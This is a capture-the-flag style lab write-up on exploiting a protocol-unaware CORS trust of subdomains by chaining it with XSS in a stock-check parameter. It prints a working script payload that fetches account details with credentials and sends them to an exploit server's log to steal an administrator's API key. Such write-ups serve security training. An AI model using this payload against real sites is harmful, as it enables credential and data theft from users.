### CORS vulnerability with trusted insecure protocols
This is a challenging LAB, at least for me, since I had problem to understand how CORS related concepts work clearly.<br>
We have the following information:
1. This website has an insecure CORS configuration that trusts all subdomains 
1. The trust relation is not protocol aware

To solve the lab we have to get the administrator's API key, expoliting CORS vulnerability using Javascript, so we can infer that we need to implement some asynchronous mechanism.<br>
First of we have to find the insecure CORS configuration, inspecting the history in Burp proxy we can see that a response to the <b>accountDetails request</b> is in a JSON format, moreover we can notice that in the response the <b>Access-Control-Allow-Credentials</b> is set, that suggests that an asynchronous request could be in place.
<br>![img](./img/55.png)<br>
Lets try to test the CORS security context adding the <b>origin</b> header to the request, if we get back the origin value in the <b>Access-Control-Allow-Origin</b> it means that the response can be shared with requesting code from the given origin. The use cases tested are the following:
+ Origin: null -> fails: Access-Control-Allow-Origin is not returned
+ Origin: https://www.google.it -> fails as above
+ Origin: https://test.LAB-ID..web-security-academy.net -> <b>OK</b>: the value is reflected into Access-Control-Allow-Origin response header
<br>![img](./img/56.png)<br>
So we know that we can issue cross-site request from a subdomain. Now we have to find a vulnerability to be exploited through a web page hosted in a lab sunbdomains, again lets inspect the Burp history while we navigate the lab. 
<br>![img](./img/57.png)<br>
From the above image we can see that a call to the <b>stock subdomain</b> is performed to check the stock amount, then sending the request to the Repeater we can try to verify if the query string parameters are injectable:
<br>![img](./img/58.png)<br>
The <b>productId</b> parameter is right to us, since  is prone to XSS attacks, we can take advantages of this vulnerability to exploit the CORS security lack. First of all, we will test if we are able to get the account details information for the current user, from the vulnerable stock web page hosted in the lab subdomain. We will delivery the following payload to try to get the account details for the current logged user (we must use credentials: 'include' in the fetch request to pass the credentials).
<br>![img](./img/59.png)<br>
Further we can see the response in the browser (right click in request section in the Repeater to get the URL)
<br>![img](./img/60.png)<br>
Finally we craft the payload to be set in the exploit server, we have to direct the flow to the vulnerable stock page first, then we redirect the response containing the account details to the exploit server log page as the query string parameter:
<br>![img](./img/61.png)<br>
As shown in the image above, I encoded (URL format) the actual payload passed as <b>productID parameter</b> (highlighted), for your convenience this is the plain version:
```
<script>
fetch('https://0a6e004204f74b30c142e98100f9006b.web-security-academy.net/accountDetails', {credentials: 'include'})
.then(response => response.text())
.then((response) => document.location='https://exploit-0aa600e7048e4bcac12de85a010500dd.exploit-server.net/log?x='+response);</script>

```
Once the explit is stored (1) we can verify if it works (2). As shown below, we can see that the redirection to exploit server access log works and that the account details are trasmitted into the query string
<br>![img](./img/62.png)<br>
Then we can delivery our payload to the victim and inspecting the access log: we can see the account details (URL encoded) for the administrator user
<br>![img](./img/63.png)<br>
Decode the query string <b>x parameter</b> value to get the API key

References:
+ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode
+ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site
+ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin
+ https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
